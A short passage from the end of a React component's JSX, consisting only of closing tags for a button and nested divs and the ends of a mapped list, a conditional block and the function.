                      </button>
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
